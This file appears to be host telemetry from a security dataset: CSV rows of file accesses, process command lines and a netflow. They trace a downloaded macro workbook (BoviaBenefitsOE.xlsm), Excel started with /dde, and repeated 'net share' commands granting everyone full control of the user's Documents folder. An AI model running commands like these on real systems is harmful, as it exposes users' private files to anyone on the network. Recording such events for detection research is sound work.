0BFE17F6-9C70-44E6-AAE6-3251859F22C7,"{'file': '{""C:\\\\\\\\Windows\\\\\\\\System32\\\\\\\\en-US\\\\\\\\taskkill.exe.mui""}'}",1332314
C3F96165-D4D5-458A-BBBE-84A71E1D444F,"{'file': '{""\\\\\\\\Device\\\\\\\\HarddiskVolume2\\\\\\\\Windows\\\\\\\\System32\\\\\\\\en-US\\\\\\\\taskkill.exe.mui""}'}",1332315
9E8F6990-153B-4A4B-8499-3AAAC2008E5B,"{'file': '{""C:\\\\\\\\Users\\\\\\\\admin\\\\\\\\Documents\\\\\\\\trains.rtf""}'}",1316052
DCD013E9-7010-4A51-9FEC-8B653C981C7C,"{'file': '{""\\\\\\\\Device\\\\\\\\HarddiskVolume2\\\\\\\\Users\\\\\\\\admin\\\\\\\\AppData\\\\\\\\Roaming\\\\\\\\Microsoft\\\\\\\\Excel\\\\\\\\BoviaBenefitsOE306586132161491315\\\\\\\\BoviaBenefitsOE.xlsm.lnk""}'}",1332062
FE198927-F937-4FD2-B6E6-041C3D47017B,{'subject': 'None net  share mydocs=C:\\\\Users\\\\admin\\\\Documents\\\\mydocs '},512863
15DA2C71-74C2-40F1-9D3E-27F2F098C921,"{'file': '{""Device\\\\\\\\HarddiskVolume2\\\\\\\\Users\\\\\\\\admin\\\\\\\\AppData\\\\\\\\Roaming\\\\\\\\Microsoft\\\\\\\\Excel\\\\\\\\BoviaBenefitsOE306586132161491315\\\\\\\\BoviaBenefitsOE.xlsm.lnk""}'}",1332064
58DA6981-E3A9-4F28-BFCA-C27F66331B20,"{'file': '{""\\\\\\\\Device\\\\\\\\HarddiskVolume2\\\\\\\\Users\\\\\\\\admin\\\\\\\\Documents\\\\\\\\MissleAlert.rtf:Zone.Identifier""}'}",1332193
54937D7E-B2F2-4A1E-B631-8E946174793D,{'subject': 'None C:\\\\WINDOWS\\\\system32\\\\net1  share mydocs=C:\\\\Users\\\\admin\\\\Documents\\\\mydocs '},512867
34DA6E7F-067D-4FCB-AF1F-014F36D3AF7B,"{'file': '{""Device\\\\\\\\HarddiskVolume2\\\\\\\\Users\\\\\\\\admin\\\\\\\\Documents\\\\\\\\BoviaBenefitsOE.xlsm""}'}",1001192
845B7C61-4397-4E0D-A23A-A22BDE2CA4D7,"{'file': '{""\\\\\\\\Device\\\\\\\\HarddiskVolume2\\\\\\\\Users\\\\\\\\admin\\\\\\\\Documents\\\\\\\\BoviaBenefitsOE.xlsm""}'}",1001194
92161288-8270-4B8E-93B5-E9E81140C04C,"{'subject': 'None net  share mydocs=C:\\\\Users\\\\admin\\\\Documents\\\\mydocs /grant:everyone,FULL'}",512875
410FC7CC-FBEA-4F03-866C-B48F9D141521,"{'file': '{""Device\\\\\\\\HarddiskVolume2""}'}",921596
19DEF44F-36D5-43D3-9D1E-EB80AD06C22B,"{'file': '{""C:\\\\\\\\Users\\\\\\\\admin\\\\\\\\AppData\\\\\\\\Roaming\\\\\\\\Microsoft\\\\\\\\Excel\\\\\\\\BoviaBenefitsOE306586132161491315\\\\\\\\BoviaBenefitsOE.xlsm.lnk""}'}",1332077
91386EE2-F150-4B10-8B18-954A8C04198D,{'subject': 'None None'},511596
97485B66-8CFA-4448-BA56-8D7F67EBA308,"{'subject': 'None C:\\\\WINDOWS\\\\system32\\\\net1  share mydocs=C:\\\\Users\\\\admin\\\\Documents\\\\mydocs /grant:everyone,FULL'}",512879
EF82624E-5D48-4520-8642-0ACF0651E5F7,"{'subject': 'None \\""C:\\\\Program Files (x86)\\\\Microsoft Office\\\\Office15\\\\EXCEL.EXE\\"" /dde'}",511595
CFFDF1EF-1349-428E-A4E3-26460EE8F8F4,{'subject': 'None None'},512235
A2228FBE-118E-44C1-8D52-0A66D3CC12AC,{'netflow': '128.55.12.67:57619->208.75.117.5:80'},95347
6C407DBE-9B5F-443F-BB1C-1DD12FAA1C6C,"{'file': '{""Device\\\\\\\\DeviceApi""}'}",923509
541E7952-4CE8-4AE4-9219-F450D3E6D300,"{'file': '{""Device\\\\\\\\HarddiskVolume2\\\\\\\\Users\\\\\\\\admin\\\\\\\\Desktop\\\\\\\\BoviaBenefitsOE.xlsm""}'}",1001210
214DB50B-FC64-492E-9246-ACA531EB97E2,"{'file': '{""Device\\\\\\\\HarddiskVolume2\\\\\\\\Users\\\\\\\\admin\\\\\\\\Desktop\\\\\\\\BoviaBenefitsOE.xlsm:Zone.Identifier""}'}",1001212
49DC2715-EC0F-46A7-8A39-9E6061204AC4,"{'file': '{""\\\\\\\\Device\\\\\\\\HarddiskVolume2\\\\\\\\Users\\\\\\\\admin\\\\\\\\Desktop\\\\\\\\BoviaBenefitsOE.xlsm""}'}",1001213
